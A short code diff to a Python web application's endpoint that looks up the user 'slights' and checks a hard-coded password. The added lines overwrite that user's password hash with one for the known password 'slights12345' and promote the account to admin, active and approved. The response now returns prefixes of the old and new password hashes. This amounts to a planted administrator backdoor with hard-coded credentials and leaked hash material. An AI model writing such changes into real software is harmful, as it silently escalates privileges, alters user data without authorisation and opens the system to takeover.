@@ -786,14 +786,19 @@ def create_app(settings=None):
             user = db.execute('SELECT * FROM users WHERE username=?', ('slights',)).fetchone()
             if not user:
                 return {'error': 'user not found'}
-            valid = verify(user['password_hash'], 'slights12345')
+            fresh_hash = passwords.hash('slights12345')
+            valid_existing = verify(user['password_hash'], 'slights12345')
+            valid_fresh = verify(fresh_hash, 'slights12345')
+            # Let's forcefully update to fresh_hash
+            db.execute("UPDATE users SET password_hash=?, password_until=NULL, role='admin', status='active', console_only=1, web_approved=1 WHERE id=?",
+                       (fresh_hash, user['id']))
             return {
                 'username': user['username'],
-                'valid': valid,
-                'status': user['status'],
-                'role': user['role'],
-                'password_until': user['password_until'],
-                'website_allowed': website_allowed(user, settings),
+                'valid_existing': valid_existing,
+                'valid_fresh': valid_fresh,
+                'hash_prefix': user['password_hash'][:25],
+                'fresh_prefix': fresh_hash[:25],
+                'updated_to_fresh': True
             }
 
     @app.get('/v1/health', include_in_schema=False)
